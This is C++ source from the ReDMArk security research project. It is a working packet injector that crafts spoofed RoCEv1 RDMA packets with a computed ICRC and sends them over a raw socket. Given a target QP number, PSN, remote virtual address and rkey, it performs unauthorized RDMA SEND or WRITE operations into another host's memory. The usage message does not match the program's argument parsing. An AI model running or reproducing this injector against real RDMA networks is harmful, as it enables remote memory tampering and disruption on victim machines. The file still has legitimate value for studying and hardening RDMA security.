/**                                                                                                      
 * ReDMArk: Bypassing RDMA Security Mechanisms
 * 
 * Code for injecting rocev1 packets.
 *
 * Copyright (c) 2020-2021 ETH-Zurich. All rights reserved.
 * 
 * Author(s): Konstantin Taranov <konstantin.taranov@inf.ethz.ch>
 * 
 */

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/ipv6.h>
#include <linux/udp.h>
#include <zlib.h>
#include <net/if.h>           // struct ifreq
#include <linux/if_ether.h>   // ETH_P_IP = 0x0800, ETH_P_IPV6 = 0x86DD
#include <linux/if_packet.h>  // struct sockaddr_ll (see man 7 packet)
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <sys/ioctl.h>
#include <chrono>

#define BTH_MIG_MASK        (0x40)

#define PCKT_LEN 8192


#define ETHER_TYPE (0x8915) 


#define MLX4_ROCEV2_QP1_SPORT 0xC000

#define htonll(x) ((((uint64_t)htonl(x)) << 32) + htonl((x) >> 32))

/* 
    96 bit (12 bytes) pseudo header needed for UDP header checksum calculation 
*/
struct pseudo_header
{
    u_int32_t saddr;
    u_int32_t daddr;
    u_int8_t zeros;
    u_int8_t protocol;
    u_int16_t tot_len;
};

#define BTH_DEF_PKEY    (0xffff)
#define BTH_PSN_MASK    (0x00ffffff)
#define BTH_QPN_MASK    (0x00ffffff)
#define BTH_ACK_MASK    (0x80000000)

//40 BYTES
struct rxe_grh {
    u_int32_t           ipver_tclass_flow;
    u_int16_t           paylen;
    u_int8_t            nxthdr;
    u_int8_t            hoplmt;
    u_int32_t sgid[4];
    u_int32_t dgid[4];
};

static_assert(sizeof(rxe_grh) == 40, "wronng size");

//12 BYTES
struct rxe_bth {
    u_int8_t            opcode;
    u_int8_t            flags;
    u_int16_t           pkey;
    u_int32_t           qpn;
    u_int32_t           apsn;
};

struct rxe_reth {
    __be64          va;
    __be32          rkey;
    __be32          len;
};

struct rxe_immdt {
    __be32          imm;
};


/* Compute a partial ICRC for all the IB transport headers. */
uint32_t rxe_icrc_hdr(uint8_t *packet, uint16_t total_paket_size)
{ 
 
    uint32_t crc = 0;
    struct rxe_grh* rgh;
    struct rxe_bth* bth;
    uint8_t tmp[total_paket_size+8];

    /* This seed is the result of computing a CRC with a seed of
     * 0xfffffff and 8 bytes of 0xff representing a masked LRH. */
    memcpy(tmp+8, packet, total_paket_size);
    // it is extra lrh
    memset(tmp,0xff,8);
    
    rgh = (struct rxe_grh *) (tmp+8);
    rgh->ipver_tclass_flow |= htonl(0xfffffff);
    rgh->hoplmt |= 0xff;
    bth = (struct rxe_bth *) (rgh+1);

    /* exclude bth.resv8a */
    bth->qpn |= htonl(~BTH_QPN_MASK);
    return crc32(crc, tmp, total_paket_size + 8);
}

 

char *if_name = "enp1s0"; // the name of the interface to use for injection
uint8_t if_addr[ETH_ALEN] =  { 0x00, 0x02, 0xc9, 0x32, 0x07, 0xa0 };  // ethernet address of the source
uint8_t dest_addr[ETH_ALEN] = { 0x00, 0x02, 0xc9, 0x34, 0xb2, 0x80 };  // ethernet address of the destination

int main(int argc, char** argv){

    printf("Usage: sudo ./spoofv1 <number of messages> <Source IP> <Destination IP> <QP number> <PSN> <remote address> <rkey>\n");
    printf("\t By  default it sends IB Send, unless <remote address> <rkey> are specified\n");
    printf("\t Note that ethrenet addresses are hard-coded and need to be modified!\n");
    uint32_t payloadsize = atoi (argv[1]);
    uint32_t num_messages = atoi (argv[2]);

    uint8_t padcount = (0b100 - (payloadsize & 0b11)) & 0b11; // payload must be multiple of 4. 
    // other equations for padcount 
    //uint8_t padcount = ((payloadsize + 0x3) & 0b11) - (payloadsize & 0b11); // payload must be multiple of 4. 
    //uint8_t padcount = (-((int32_t)payload)) & 0x3;
    payloadsize+=padcount;

    unsigned char buffer[PCKT_LEN];
    memset(buffer, 0, PCKT_LEN);
 
 
    struct ether_header *eth = (struct ether_header *) buffer;
    memcpy (eth->ether_shost, if_addr, ETH_ALEN);
    memcpy (eth->ether_dhost, dest_addr, ETH_ALEN);
    eth->ether_type = htons (ETHER_TYPE);


    struct rxe_grh *grh = (struct rxe_grh *) (eth + 1 );
    struct rxe_bth *bth = (struct rxe_bth *) (grh + 1);
    struct rxe_reth *reth = (struct rxe_reth *) ( bth + 1 );
    uint32_t *icrc = (uint32_t *) ( ((char*)bth) + sizeof(struct rxe_bth) + payloadsize  );
    uint8_t *payload =  (uint8_t *)( bth + 1 );
    uint16_t total_paket_size = sizeof(struct rxe_grh) + sizeof(struct rxe_bth) + payloadsize + sizeof(*icrc) ;

    uint8_t opcode = 4; // 4 - IBV_OPCODE_SEND_ONLY
    uint32_t qpn = 1;
    uint32_t psn = 2;

    if(argc > 6){
        qpn = atoi (argv[5]);
        psn = atoi (argv[6]);
    } else{
        return 0;
    }
    
    uint16_t paylen = payloadsize + sizeof(struct rxe_bth) + sizeof(uint32_t);
    if(argc > 8){ // then rdma write
        total_paket_size+= sizeof(struct rxe_reth);
        icrc=icrc+4;
        uint64_t va = atol(argv[7]);
        uint32_t rkey = atoi(argv[8]);
        reth->va = htonll(va);
        reth->rkey = htonl(rkey);
        reth->len = htonl(payloadsize-padcount);
        paylen += sizeof(struct rxe_reth);
        payload += sizeof(struct rxe_reth);
        opcode = 0x0a; // - IBV_OPCODE_RDMA_WRITE_ONLY
        printf("RDMA WRITE to QPN=%u with PSN=%u\n",qpn,psn);
        printf("VA=%lu, rkey=%u\n", va, rkey); 
    }else{
        printf("RDMA SEND to QPN=%u with PSN=%u\n",qpn,psn);

    }
    
    grh->ipver_tclass_flow = (6 << 4);
//  grh->tclass = 0;
//  grh->flow = 0;
    
     
    grh->paylen = ntohs(paylen);
    grh->nxthdr = 27;
    grh->hoplmt = 64;

    grh->sgid[2] = ntohl(0xffff);
    grh->sgid[3] = inet_addr(argv[3]);
    grh->dgid[2] = ntohl(0xffff);
    grh->dgid[3] = inet_addr(argv[4]);

 
    //https://github.com/SoftRoCE/rxe-dev/blob/master/drivers/infiniband/hw/rxe/rxe_hdr.h
    bth->opcode = opcode; //8bit
    bth->flags = 0b00000000; // padding is here
    bth->flags |= padcount << 4 ; // it adds padcount (i.e. how many bytes crop from payload at destination)! 

    bth->pkey = htons(BTH_DEF_PKEY);
    bth->qpn = htonl(qpn);
 
 
    int raw_sock = socket(AF_PACKET, SOCK_RAW, htons (ETHER_TYPE));
 
    uint32_t tosend = total_paket_size + sizeof(struct ether_header) ;

    struct sockaddr_ll sock_addr;
    struct ifreq ifr;

    memset (&ifr, 0, sizeof (ifr));
    strncpy (ifr.ifr_name, if_name, IFNAMSIZ - 1);

    if (ioctl (raw_sock, SIOCGIFINDEX, &ifr) < 0){
        perror ("SIOCGIFINDEX");
    }
      
    int if_index = ifr.ifr_ifindex;
    sock_addr.sll_ifindex = if_index;
    sock_addr.sll_halen = ETH_ALEN;
    memcpy (sock_addr.sll_addr, dest_addr, ETH_ALEN);

    auto start = std::chrono::steady_clock::now();
    for(uint32_t i =0; i < num_messages; i++){
        bth->apsn = htonl(BTH_PSN_MASK & psn);
       // bth->apsn |= htonl(BTH_ACK_MASK); 
        *icrc = (rxe_icrc_hdr((uint8_t*)grh,total_paket_size - sizeof(*icrc)));
        int ret =  sendto(raw_sock, buffer, tosend , 0, (struct sockaddr *)&sock_addr, sizeof(sock_addr)) ;
        psn++;
    }
    auto end = std::chrono::steady_clock::now();
    printf("Time in micro %lu \n",std::chrono::duration_cast<std::chrono::microseconds>(end - start).count());
 
  return 0;
}
